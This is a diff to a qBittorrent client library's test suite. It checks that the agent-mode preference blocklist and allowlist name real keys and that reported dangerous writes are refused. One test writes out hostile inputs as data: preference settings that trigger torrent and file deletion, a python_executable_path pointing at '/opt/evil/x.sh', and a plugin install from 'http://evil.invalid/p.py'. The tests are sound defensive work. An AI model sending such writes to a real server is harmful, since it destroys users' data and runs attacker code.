@@ -447,12 +447,92 @@ def test_every_blocklisted_preference_key_actually_exists(seeder: Client) -> Non
     # by loosening the assertion for everything.
     write_only = {"web_ui_password"}
 
+    # Keys qBittorrent grew later. Blocking one on a server that has never heard
+    # of it guards nothing, but there is nothing to guard there either. Gating on
+    # the measured version keeps the typo check strict everywhere the key exists,
+    # rather than loosening the assertion for every key to accommodate one.
+    # Measured: absent on WebAPI 2.9.3 (qBittorrent 4.6.7), present on 2.11.2
+    # (5.0.2) and later.
+    introduced_in = {"python_executable_path": (2, 11, 2)}
+
     prefs = seeder.call("app/preferences")
-    phantom = sorted(k for k in LOCKOUT_KEYS - write_only if k not in prefs)
+    phantom = sorted(
+        k
+        for k in LOCKOUT_KEYS - write_only
+        if k not in prefs and seeder.version >= introduced_in.get(k, (0, 0, 0))
+    )
     assert not phantom, (
         f"blocklisted keys that this server does not expose, so they guard "
         f"nothing: {phantom}. Check the spelling against app/preferences."
     )
+
+
+def test_every_allowlisted_preference_key_actually_exists(seeder: Client) -> None:
+    """A misspelled allowlist entry is worse than a misspelled blocklist one.
+
+    A phantom blocklist key fails open for a key nobody can write anyway. A
+    phantom *allowlist* key is dead weight that hides a real one: the key an
+    agent actually needs stays refused, so the first symptom is a working call
+    that stopped working, and the temptation is to widen the list rather than
+    fix the spelling.
+    """
+    from qbtkit.spec.app import SAFE_PREF_KEYS
+
+    # Keys qBittorrent renamed. Only one spelling exists on any given server, so
+    # neither can be asserted outright; both stay on the allowlist so an agent
+    # works across the supported range. Asserting "at least one" still catches a
+    # typo in either half.
+    renamed_pairs = (("add_stopped_enabled", "start_paused_enabled"),)
+
+    prefs = seeder.call("app/preferences")
+    for pair in renamed_pairs:
+        assert any(k in prefs for k in pair), (
+            f"neither spelling of {pair} exists on this server, so the allowlist "
+            f"entry guards nothing and the agent path is broken for it"
+        )
+
+    aliases = {k for pair in renamed_pairs for k in pair}
+    phantom = sorted(k for k in SAFE_PREF_KEYS - aliases if k not in prefs)
+    assert not phantom, (
+        f"allowlisted keys this server does not expose: {phantom}. Either the "
+        f"spelling is wrong or they belong to a different qBittorrent version — "
+        f"check against app/preferences before widening the list."
+    )
+
+
+def test_the_reported_deletion_and_execution_keys_are_refused(seeder: Client) -> None:
+    """The two preference writes from the external report, against a real server
+    that would accept them, through a client in agent mode."""
+    from qbtkit.client import Client as RealClient
+
+    agent = RealClient(
+        seeder.url,
+        username=seeder._username,
+        password=seeder._password,
+        agent=True,
+        use_keychain=False,
+    )
+    try:
+        before = seeder.call("app/preferences")
+        with pytest.raises(errors.QbtError):
+            agent.call(
+                "app/setPreferences",
+                json={
+                    "max_seeding_time_enabled": True,
+                    "max_seeding_time": 0,
+                    "max_ratio_act": 3,
+                },
+            )
+        with pytest.raises(errors.QbtError):
+            agent.call("app/setPreferences", json={"python_executable_path": "/opt/evil/x.sh"})
+        with pytest.raises(errors.QbtError):
+            agent.call("search/installPlugin", sources="http://evil.invalid/p.py")
+        after = seeder.call("app/preferences")
+        for key in ("max_ratio_act", "max_seeding_time", "python_executable_path"):
+            if key in before:
+                assert after[key] == before[key], f"{key} was changed despite the gate"
+    finally:
+        agent.close()
 
 
 def test_blocklist_refuses_the_real_host_header_key(seeder: Client) -> None:
